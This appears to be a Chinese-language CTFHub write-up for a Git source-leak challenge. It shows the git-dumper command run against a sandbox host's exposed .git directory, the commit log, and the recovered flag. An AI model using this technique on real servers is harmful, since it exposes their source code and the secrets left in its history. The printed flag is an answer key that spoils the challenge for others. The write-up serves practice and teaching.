## 题目信息
- 平台：CTFHub
- 类型：Web - 信息泄露
- Flag：`ctfhub{56c1db09e73dca9382e21073}`

## 考点
Git 源码泄露、Git 版本历史回溯

## 解题思路
访问靶机首页没有拿到 Flag，尝试访问常见泄露路径 `/.git/`，返回 403，说明存在 `.git` 目录但是关闭了目录索引。
我们可以使用 `git-dumper` 拉取整个 Git 仓库。最新提交已经把 Flag 删除，需要查看历史提交记录，找到 `add flag` 的版本拿到 Flag。

## 复现过程
1. 访问靶机，页面提示 `Where is flag`，无直接可用信息。
2. 访问 `/.git/`，服务器返回 403 Forbidden，确认存在 Git 泄露。
3. 使用 git-dumper 下载仓库到本地：
```bash
git-dumper http://challenge-b90ef834f0e949ff.sandbox.ctfhub.com:10800/.git/ ./git_result
4. 进入 git_result 目录，查看提交日志：
bash
git log
日志输出：
commit a059f47745e9202b9a44e06e2cdc9dad94a2d48 (HEAD -> master)
Author: CTFHub <sandbox@ctfhub.com>
Date:   Mon Oct 26 08:34:25 2026 +0000
    remove flag

commit cac69899b01332f8698f47841edb4b4f5af73e9
Author: CTFHub <sandbox@ctfhub.com>
Date:   Mon Oct 26 08:34:25 2026 +0000
    add flag

commit a66f8115ebf2121968975bc7b8f2b35efdea8373
Author: CTFHub <sandbox@ctfhub.com>
Date:   Mon Oct 26 08:34:25 2026 +0000
    init
5. 查看 add flag 提交源码：
bash
git show cac69899b01332f8698f47841edb4b4f5af73e9
6. 在源码内提取 Flag。